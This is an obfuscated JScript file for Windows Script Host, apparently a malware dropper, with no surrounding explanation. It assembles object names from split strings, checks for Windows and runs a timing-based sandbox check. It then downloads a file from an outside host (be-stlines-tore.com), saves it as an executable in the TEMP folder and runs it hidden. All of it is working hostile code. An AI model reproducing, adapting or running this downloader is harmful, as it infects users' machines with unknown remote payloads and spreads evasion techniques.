var R = false;
var UR = "Create"+"Object";
var WA = function CK() {return WScript[UR]("WScript"+".Shell");}(), MN = 11;
var F0 = "MSXML2"+".XMLHTTP";
var W = 2;
var O = W - 2;
function VG(LP){WA["Run"](LP, O, O);};
function JR(){return F0 + "";};
function BS(UZ, TO){O = O * 1; return UZ - TO;};
function F(){return UR;};
/*@cc_on
  @if (@_win32 || @_win64)
    R = true;
  @end
@*/
if (R)
{
var CJ = "";
function GS(){return 22;};
var VX = 0; var CF = 0;
function BA()
{
var T0 = new this["Date"]();
var T = T0["getUTCMilliseconds"]();
WScript["Sleep"](GS());
var T0 = new this["Date"]();
var H1 = T0["getUTCMilliseconds"]();
WScript["Sleep"](GS());
var T0 = new this["Date"]();
var G = T0["getUTCMilliseconds"]();
var VX = "J0";
VX = BS(H1, T);
var CF = "M";
CF = BS(G, H1);
CJ = "open";
return BS(VX, CF);
}
var VM = false;
var OA = false;
for (var OU = O; OU < GS() * 1; OU++){if (BA() != O){
VM = true; 
CF = "31" + 11 * VX + CF; 
OA = true; 
break;
}}
function C() {return ((VM == true) && (VM == OA)) ? 1 : O;};
if (VM && C() && OA){
function H() {return WA["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "lxneMxcsi0Qf.ex" + "e";};
 MA = JR();
 BK = WScript[UR](MA);
 var J = 1;
do { 
	for (;J;){
	try {
		if (J == 1)
		{
			BK[CJ]("GET", "http://be-stlines-tore.com/k3soa", false);
			BK["send"]();
			AY = "Sleep";
			J = 2;
		}
		WScript[AY](GS() + 120); 
		if (BK["readystate"] < 2 * 2) continue;
		J = O;
		function C0(NY) {var ZH = (1, 2, 3, 4, 5, NY); return ZH;};
		YK = WScript[F()]("ADODB.Stream");
		MA = YK;
		MA[CJ]();
		MA["type"] = C0(1);
		MA["write"](BK["ResponseBody"]);
		YK["position"] = C0(O);
		MA["Save" + "ToFile"](H(), 2);
		YK["cl"+"ose"]();
		H0 = H();
		VG(H0);
	} catch(PW){};};
}while (J);
}
}

